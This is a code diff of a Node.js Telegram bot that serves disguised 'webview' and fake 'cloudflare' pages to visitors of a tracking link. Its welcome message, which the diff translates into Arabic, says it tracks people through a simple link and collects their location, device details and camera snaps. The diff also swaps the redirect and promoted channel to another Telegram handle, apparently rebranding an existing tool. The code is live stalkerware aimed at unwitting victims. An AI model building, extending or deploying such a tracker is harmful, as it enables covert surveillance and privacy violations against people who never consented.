@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/name_dark");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/name_dark");
 }
 
          
@@ -71,7 +71,15 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \n
+يمكنك استخدام هذا الروبوت لتعقب الأشخاص فقط في خلال رابط بسيط. يمكنه جمع معلومات مثل الموقع ومعلومات الجهاز ولقطات الكاميرا 
+ 
+ يجب عليك الانضام من القناه حتي لا تواجه مشاكل
+
+https://t.me/name_dark
+	
+				
+\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
